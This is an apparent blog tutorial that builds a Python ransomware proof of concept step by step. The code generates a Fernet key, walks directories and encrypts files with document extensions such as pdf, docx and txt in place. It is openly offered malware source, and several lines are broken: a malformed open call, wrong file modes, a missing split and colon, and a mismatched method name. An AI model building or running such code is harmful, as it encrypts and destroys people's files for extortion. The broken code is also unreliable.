I"@<h3 id="ransomware-concept">Ransomware Concept</h3>
<p>The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python.</p>

<h4 id="to-do">To do:</h4>
<ol>
  <li>generate a key to be used for encryption and decryption</li>
  <li>write a key</li>
  <li>read a key</li>
  <li>scanning directory</li>
  <li>encypt the target files</li>
  <li>create cli interface</li>
</ol>

<h3 id="generate-a-key-to-be-used-for-encryption-and-decryption">generate a key to be used for encryption and decryption</h3>
<p>for this we can use the <a href="https://cryptography.io/en/latest/fernet/">Fernet(Semantic Encrytion)</a> so import that.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  1 import os
  2 from os.path import expanduser
  3 from cryptography.fernet import Fernet

</code></pre></div></div>

<p>create a class and create a constructor, below that is the generateKey function</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  5 class Encrypt:
  6 
  7     def __init__(self):
  8 
  9         self.key = None
 10         self.cryptor = None
 11         self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']
 12 
 13     def generateKey(self):
 14 
 15         self.key = Fernet.generate_key()
 16         self.cryptor = Fernet(self.key)

</code></pre></div></div>

<h3 id="write-a-key">write a key</h3>
<p>now lets create a function to write the key to a file</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 23     def writeKey(self, key_filename):
 24         with open.(key_filename, 'b') as f:
 25             f.write(self.key)

</code></pre></div></div>

<h3 id="read-a-key">read a key</h3>
<p>moving on, create a function to read a key from a file</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 18     def readKey(self, key_filename):
 19         with open(key_filename, 'a') as f:
 20             self.key = f.read()
 21             self.cryptor = Fernet(self.key)

</code></pre></div></div>

<h3 id="scanning-directory">scanning directory</h3>
<p>the function below allows you to scan the directories and check for target filename extensions specified earlier on self.file_ext_targets</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 28     def mainCrypt(self, root_dir, encrypted = False):
 29         for root, _, files in os.walk(root_dir):
 30             for f in files:
 31                 abs_file_path = os.path.join(root, f)
 32 
 33                 if not abs_file_path('.')[-1] in self.file_ext_targets:
 34                     continue
 35 
 36                 self.crypt_file(abs_file_path, encrypted = encrypted)

</code></pre></div></div>

<h3 id="encrypt-the-target-files">encrypt the target files</h3>
<p>function to encrypt the specified filename extensions</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 38     def encryptFile(self, file_path, encrypted = False):
 39         with open(file_path, 'a+') as f:
 40             _data = f.read()
 41 
 42             if not encrypted:
 43                 data = self.cryptor.encrypt(_data)
 44             else
 45                 data = self.cryptor.decrypt(_data)
 46 
 47             f.seek(0)
 48             f.write(data)

</code></pre></div></div>

<p>###</p>
:ET